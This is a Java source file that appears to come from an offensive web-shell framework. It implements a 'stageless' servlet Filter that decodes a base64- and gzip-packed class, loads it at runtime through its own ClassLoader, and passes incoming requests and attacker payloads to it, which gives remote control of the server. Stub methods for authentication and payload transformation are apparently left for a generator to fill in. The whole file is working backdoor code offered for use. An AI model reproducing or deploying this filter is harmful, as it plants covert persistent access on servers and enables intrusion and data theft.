package com.reajason.noone.core.shelltool;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2025/8/29
 */
public class NoOneStagelessFilter extends ClassLoader implements Filter {

    private static volatile Class<?> coreClass = null;
    private static String coreGzipBase64;

    public NoOneStagelessFilter() {
    }

    public NoOneStagelessFilter(ClassLoader parent) {
        super(parent);
    }

    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;
        try {
            // stageless
            if (isAuthed(request)) {
                ServletOutputStream responseOutputStream = response.getOutputStream();
                try {
                    if (coreClass == null) {
                        synchronized (NoOneStagelessFilter.class) {
                            if (coreClass == null) {
                                byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
                                coreClass = new NoOneStagelessFilter(Thread.currentThread().getContextClassLoader())
                                        .defineClass(bytes, 0, bytes.length);
                            }
                        }
                    }
                    byte[] payload = transformReqPayload(getArgFromRequest(request));
                    Object httpChannelCore = coreClass.newInstance();
                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                    httpChannelCore.equals(new Object[]{request, response});
                    httpChannelCore.equals(new Object[]{payload, outputStream});
                    byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
                    responseOutputStream.write(data);
                } catch (Exception e) {
                    responseOutputStream.write(getStackTraceAsString(e).getBytes("UTF-8"));
                }
                wrapResponse(response);
                responseOutputStream.flush();
                responseOutputStream.close();
                return;
            }
        } catch (Throwable ignored) {
        }
        chain.doFilter(request, response);
    }

    private boolean isAuthed(Object request) {
        return true;
    }

    private byte[] getArgFromRequest(Object request) {
        return new byte[0];
    }

    private byte[] transformReqPayload(byte[] input) {
        return input;
    }

    private byte[] wrapResData(byte[] payload) {
        return payload;
    }

    private byte[] transformResData(byte[] payload) {
        return payload;
    }

    private void wrapResponse(Object response) {
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Throwable e) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    private String getStackTraceAsString(Throwable throwable) {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        throwable.printStackTrace(pw);
        return sw.toString();
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void destroy() {

    }
}
